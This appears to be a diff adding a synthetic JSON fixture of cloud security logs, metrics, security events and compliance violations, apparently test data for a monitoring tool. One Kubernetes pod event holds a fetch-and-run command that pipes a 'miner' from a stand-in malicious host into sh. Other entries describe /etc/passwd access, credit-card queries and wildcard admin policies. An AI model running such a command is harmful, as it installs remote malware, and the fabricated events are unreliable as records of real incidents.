@@ -1,0 +1,372 @@
+{
+  "logdna_logs": [
+    {
+      "timestamp": "2025-06-16T10:30:15.123Z",
+      "level": "INFO",
+      "host": "web-server-01",
+      "app": "payment-service",
+      "line": "User authentication successful for user_id: 12345",
+      "meta": {
+        "source_ip": "192.168.1.100",
+        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
+        "session_id": "sess_abc123"
+      }
+    },
+    {
+      "timestamp": "2025-06-16T10:31:45.456Z",
+      "level": "ERROR",
+      "host": "web-server-02",
+      "app": "payment-service",
+      "line": "Multiple failed login attempts detected from IP: 185.220.101.42",
+      "meta": {
+        "source_ip": "185.220.101.42",
+        "attempt_count": 15,
+        "timeframe": "5_minutes",
+        "target_user": "admin@company.com"
+      }
+    },
+    {
+      "timestamp": "2025-06-16T10:32:10.789Z",
+      "level": "WARN",
+      "host": "db-server-01",
+      "app": "user-database",
+      "line": "Unusual SQL query pattern detected: SELECT * FROM users WHERE credit_card LIKE '%'",
+      "meta": {
+        "query_type": "SELECT",
+        "affected_tables": ["users", "payment_info"],
+        "execution_time": "2.3s",
+        "source_ip": "10.0.0.25"
+      }
+    },
+    {
+      "timestamp": "2025-06-16T10:33:22.012Z",
+      "level": "INFO",
+      "host": "api-gateway-01",
+      "app": "rate-limiter",
+      "line": "API rate limit exceeded for client_id: mobile_app_v2",
+      "meta": {
+        "client_id": "mobile_app_v2",
+        "requests_count": 1050,
+        "limit": 1000,
+        "window": "1_hour"
+      }
+    },
+    {
+      "timestamp": "2025-06-16T10:34:55.345Z",
+      "level": "CRITICAL",
+      "host": "file-server-01",
+      "app": "document-service",
+      "line": "Unauthorized file access attempt: /etc/passwd",
+      "meta": {
+        "file_path": "/etc/passwd",
+        "source_ip": "203.0.113.45",
+        "user_agent": "curl/7.68.0",
+        "access_method": "direct_url"
+      }
+    }
+  ],
+  "activity_tracker_logs": [
+    {
+      "eventTime": "2025-06-16T10:25:30.000Z",
+      "action": "iam-identity.profile.create",
+      "outcome": "success",
+      "initiator": {
+        "id": "user-abc123",
+        "name": "john.doe@company.com",
+        "type": "user"
+      },
+      "target": {
+        "id": "profile-xyz789",
+        "name": "new-service-profile",
+        "type": "iam-profile"
+      },
+      "observer": {
+        "name": "ActivityTracker"
+      },
+      "reason": {
+        "reasonCode": 200
+      },
+      "requestData": {
+        "profile_name": "high-privilege-service",
+        "policies": ["Administrator", "Editor"]
+      }
+    },
+    {
+      "eventTime": "2025-06-16T10:28:45.000Z",
+      "action": "cloud-object-storage.bucket.delete",
+      "outcome": "success",
+      "initiator": {
+        "id": "user-def456",
+        "name": "temp.user@external.com",
+        "type": "user"
+      },
+      "target": {
+        "id": "bucket-important-data",
+        "name": "customer-financial-records",
+        "type": "cos-bucket"
+      },
+      "observer": {
+        "name": "ActivityTracker"
+      },
+      "reason": {
+        "reasonCode": 200
+      },
+      "requestData": {
+        "bucket_size": "500GB",
+        "object_count": 50000
+      }
+    },
+    {
+      "eventTime": "2025-06-16T10:30:12.000Z",
+      "action": "iam-access-management.policy.create",
+      "outcome": "success",
+      "initiator": {
+        "id": "service-ghi789",
+        "name": "automated-provisioning-service",
+        "type": "service"
+      },
+      "target": {
+        "id": "policy-wildcard-access",
+        "name": "unrestricted-access-policy",
+        "type": "access-policy"
+      },
+      "observer": {
+        "name": "ActivityTracker"
+      },
+      "reason": {
+        "reasonCode": 200
+      },
+      "requestData": {
+        "policy_document": {
+          "roles": ["Administrator"],
+          "resources": ["*"],
+          "actions": ["*"]
+        }
+      }
+    },
+    {
+      "eventTime": "2025-06-16T10:32:20.000Z",
+      "action": "kubernetes.pod.create",
+      "outcome": "success",
+      "initiator": {
+        "id": "user-jkl012",
+        "name": "developer@company.com",
+        "type": "user"
+      },
+      "target": {
+        "id": "pod-crypto-miner",
+        "name": "suspicious-workload",
+        "type": "k8s-pod"
+      },
+      "observer": {
+        "name": "ActivityTracker"
+      },
+      "reason": {
+        "reasonCode": 200
+      },
+      "requestData": {
+        "image": "alpine:latest",
+        "command": ["sh", "-c", "wget -qO- http://malicious-site.com/miner | sh"],
+        "resources": {
+          "cpu": "4000m",
+          "memory": "8Gi"
+        }
+      }
+    },
+    {
+      "eventTime": "2025-06-16T10:35:10.000Z",
+      "action": "vpc.security-group.rule.create",
+      "outcome": "failure",
+      "initiator": {
+        "id": "user-mno345",
+        "name": "external.contractor@thirdparty.com",
+        "type": "user"
+      },
+      "target": {
+        "id": "sg-prod-database",
+        "name": "production-db-security-group",
+        "type": "security-group"
+      },
+      "observer": {
+        "name": "ActivityTracker"
+      },
+      "reason": {
+        "reasonCode": 403,
+        "reasonType": "Forbidden"
+      },
+      "requestData": {
+        "rule": {
+          "direction": "inbound",
+          "port_range": "22-22",
+          "source": "0.0.0.0/0",
+          "protocol": "tcp"
+        }
+      }
+    }
+  ],
+  "monitoring_metrics": [
+    {
+      "timestamp": "2025-06-16T10:30:00.000Z",
+      "metric_name": "cpu.usage.percent",
+      "resource_id": "instance-web-01",
+      "resource_type": "virtual_server",
+      "value": 85.5,
+      "unit": "percent",
+      "dimensions": {
+        "region": "us-south",
+        "zone": "us-south-1"
+      }
+    },
+    {
+      "timestamp": "2025-06-16T10:30:00.000Z",
+      "metric_name": "network.bytes.out",
+      "resource_id": "instance-db-01",
+      "resource_type": "virtual_server",
+      "value": 1073741824,
+      "unit": "bytes",
+      "dimensions": {
+        "region": "us-south",
+        "zone": "us-south-2"
+      }
+    },
+    {
+      "timestamp": "2025-06-16T10:30:00.000Z",
+      "metric_name": "memory.usage.percent",
+      "resource_id": "k8s-node-suspicious",
+      "resource_type": "kubernetes_node",
+      "value": 98.2,
+      "unit": "percent",
+      "dimensions": {
+        "cluster": "production-cluster",
+        "namespace": "default"
+      }
+    },
+    {
+      "timestamp": "2025-06-16T10:30:00.000Z",
+      "metric_name": "disk.io.operations",
+      "resource_id": "storage-volume-01",
+      "resource_type": "block_storage",
+      "value": 50000,
+      "unit": "operations_per_second",
+      "dimensions": {
+        "volume_type": "encrypted",
+        "size": "1000GB"
+      }
+    },
+    {
+      "timestamp": "2025-06-16T10:30:00.000Z",
+      "metric_name": "api.requests.rate",
+      "resource_id": "api-gateway-prod",
+      "resource_type": "api_gateway",
+      "value": 5000,
+      "unit": "requests_per_minute",
+      "dimensions": {
+        "endpoint": "/api/v1/users",
+        "method": "GET"
+      }
+    },
+    {
+      "timestamp": "2025-06-16T10:30:00.000Z",
+      "metric_name": "container.restart.count",
+      "resource_id": "pod-crypto-miner",
+      "resource_type": "kubernetes_pod",
+      "value": 15,
+      "unit": "count",
+      "dimensions": {
+        "namespace": "default",
+        "container": "miner-container"
+      }
+    }
+  ],
+  "security_events": [
+    {
+      "timestamp": "2025-06-16T10:29:30.000Z",
+      "event_type": "authentication_anomaly",
+      "severity": "high",
+      "source": "login-service",
+      "details": {
+        "user_id": "admin@company.com",
+        "source_ip": "185.220.101.42",
+        "location": "Unknown (Tor Exit Node)",
+        "device_fingerprint": "unknown",
+        "previous_login_location": "New York, US"
+      }
+    },
+    {
+      "timestamp": "2025-06-16T10:31:15.000Z",
+      "event_type": "privilege_escalation",
+      "severity": "critical",
+      "source": "iam-service",
+      "details": {
+        "user_id": "temp.user@external.com",
+        "action": "role_assignment",
+        "from_role": "viewer",
+        "to_role": "administrator",
+        "target_resource": "entire_account"
+      }
+    },
+    {
+      "timestamp": "2025-06-16T10:33:45.000Z",
+      "event_type": "data_exfiltration_attempt",
+      "severity": "high",
+      "source": "network-monitor",
+      "details": {
+        "source_ip": "10.0.0.25",
+        "destination": "suspicious-external-server.com",
+        "data_volume": "50GB",
+        "protocol": "HTTPS",
+        "classification": "potentially_sensitive"
+      }
+    },
+    {
+      "timestamp": "2025-06-16T10:36:20.000Z",
+      "event_type": "malware_detection",
+      "severity": "critical",
+      "source": "endpoint-protection",
+      "details": {
+        "file_path": "/tmp/suspicious_binary",
+        "hash": "a1b2c3d4e5f6789...",
+        "detection_type": "cryptocurrency_miner",
+        "affected_host": "k8s-node-suspicious"
+      }
+    }
+  ],
+  "compliance_violations": [
+    {
+      "timestamp": "2025-06-16T10:27:00.000Z",
+      "violation_type": "data_retention_policy",
+      "severity": "medium",
+      "resource_id": "bucket-old-logs",
+      "details": {
+        "policy": "delete_after_7_years",
+        "actual_age": "8_years_2_months",
+        "data_classification": "personal_information",
+        "regulation": "GDPR"
+      }
+    },
+    {
+      "timestamp": "2025-06-16T10:28:30.000Z",
+      "violation_type": "encryption_requirement",
+      "severity": "high",
+      "resource_id": "database-customer-data",
+      "details": {
+        "required_encryption": "AES-256",
+        "actual_encryption": "none",
+        "data_classification": "sensitive_financial",
+        "regulation": "PCI_DSS"
+      }
+    },
+    {
+      "timestamp": "2025-06-16T10:34:00.000Z",
+      "violation_type": "access_control_policy",
+      "severity": "critical",
+      "resource_id": "policy-wildcard-access",
+      "details": {
+        "violation": "overly_permissive_access",
+        "principle": "least_privilege",
+        "affected_resources": "all_account_resources",
+        "regulation": "SOX"
+      }
+    }
+  ]
+}
